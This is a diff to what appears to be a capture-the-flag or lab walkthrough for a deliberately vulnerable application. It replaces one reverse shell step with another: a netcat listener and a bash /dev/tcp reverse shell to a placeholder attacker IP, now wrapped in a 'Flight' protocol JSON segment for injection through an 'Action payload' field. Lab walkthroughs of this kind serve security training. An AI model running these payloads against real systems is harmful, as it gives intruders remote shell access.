@@ -81,11 +81,11 @@ There are three primary ways into the system.
    ```bash
    nc -lvnp 4444
    ```
-4. Submit a reverse shell payload in the `Action payload` box. Replace `<LHOST>` with your Kali IP:
-   ```bash
-   bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
-   ```
-   *Note:* the field currently executes the raw submitted command, so do not wrap the payload in JSON.
+4. Submit a reverse shell payload in the `Action payload` box. Replace `<LHOST>` with your Kali IP.
+    *Note: the simulation now requires a "Flight" protocol segment (starting with `1:`):*
+    ```json
+    1:{"mode":"preview","action":{"type":"import","payload":"bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"}}
+    ```
 5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`. Browser-interactive shell access at `/console` remains disabled, so the host-side execution must be observed through your listener.
 6. **Flag check**: from the `www-data` shell, inspect the breadcrumb file:
    ```bash
